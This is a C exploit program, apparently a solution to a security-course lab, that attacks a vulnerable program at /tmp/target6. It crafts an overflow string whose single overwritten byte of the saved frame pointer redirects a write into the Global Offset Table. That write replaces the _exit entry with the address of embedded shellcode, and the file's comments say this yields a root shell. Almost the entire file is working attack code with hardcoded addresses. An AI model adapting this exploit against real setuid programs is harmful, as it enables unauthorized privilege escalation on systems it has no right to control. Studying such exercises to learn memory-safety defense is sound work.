#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target6"
#define EGG_SIZE 208

/* 
 * Main idea of exploit:
 *     This is a GOT exploit. 
 *
 *     In this exploit we have a buffer big enough 
 *     to hold our shellcode and we can only overwrite
 *     the LSB of the saved ebp in the bar stack frame. 
 *     The main idea is to change this byte so that the 
 *     saved ebp now points to an address inside our buffer. 
 *     The prologue for bar will restore the ebp to this 
 *     fake ebp. After control returns to foo the the next
 *     instructions will overwrite the address for _exit
 *     _exit in the Global Offset Table (GOT) with the address
 *     of our shellcode. Upon calling exit we get root shell. 
 */

int main(void)
{
  char *args[3];
  char *env[1];
  long buffAddr, gotAddr, *addrPtr;
  char egg[EGG_SIZE]; /* string containing exploit code */
  int i;

  buffAddr = 0xBFFFFC80; /* start address of buf in target6.c:bar */
  gotAddr = 0x8049774; /* GOT address for _exit */

  /* Fill egg with the address of the buffer in target6.c:bar, where shellcode resides */
  addrPtr = (long *) egg; 
  for (i = 0; i < EGG_SIZE; i += 4)
     *(addrPtr++) = buffAddr;
  
  /* write GOT addr for _exit */
  addrPtr = (long *)&egg[EGG_SIZE - 12];
  *addrPtr = gotAddr; 

  /* Last byte that will overwrite bar's saved ebp. 
     Point it inside the buffer, so that when control 
     returns to foo the instructions:
        mov    -0x8(%ebp),%edx
        mov    -0x4(%ebp),%eax
        mov    %edx,(%eax)
     will overwrite the GOT entry for _exit with the
     shellcode address. */ 
  egg[EGG_SIZE - 8] = 0x48;

  /* Then fill the first bytes of the exploit string with
     Aleph One's shellcode */
  memcpy (egg, shellcode, strlen (shellcode));

  egg[EGG_SIZE - 1] = 0; /* null terminate exploit string */

  args[0] = TARGET; args[1] = egg; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
